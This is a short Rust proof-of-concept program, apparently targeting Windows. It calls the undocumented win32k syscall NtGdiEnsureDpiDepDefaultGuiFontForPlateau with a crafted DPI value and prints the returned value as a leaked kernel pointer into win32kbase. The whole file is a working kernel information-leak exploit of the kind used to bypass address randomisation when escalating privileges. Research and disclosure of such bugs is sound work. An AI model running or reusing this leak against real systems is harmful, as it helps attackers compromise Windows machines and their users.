mod libloader;

type NtGdiEnsureDpiDepDefaultGuiFontForPlateau = extern "stdcall" fn(dpi: u32) -> u64;

#[cfg(windows)]
fn main() {
    let ntgdiensure_var : u32 = 0x1e0;
    let _gdi32_hnd = libloader::LibLoader::load_library("gdi32.dll").unwrap();
    let win32_hnd = libloader::LibLoader::get_modulehandle("win32u").unwrap();
    let ntgdiensure_fn : NtGdiEnsureDpiDepDefaultGuiFontForPlateau = win32_hnd.get_proc(
            "NtGdiEnsureDpiDepDefaultGuiFontForPlateau").unwrap();
    println!(">Calling NtGdiEnsureDpiDepDefaultGuiFontForPlateau the first time...");
    ntgdiensure_fn(ntgdiensure_var);
    let mut ret_addr = ntgdiensure_fn(ntgdiensure_var);
    println!("[+]win32kbase!gahDpiDepDefaultGuiFonts pointer: {:#x?}", ret_addr);
    println!(">Second...");
    ret_addr = ntgdiensure_fn(ntgdiensure_var);
    println!("[+]win32kbase!gahDpiDepDefaultGuiFonts pointer: {:#x?}", ret_addr);
}

#[cfg(not(windows))]
fn main() {
    println!("This is not Windows!");
}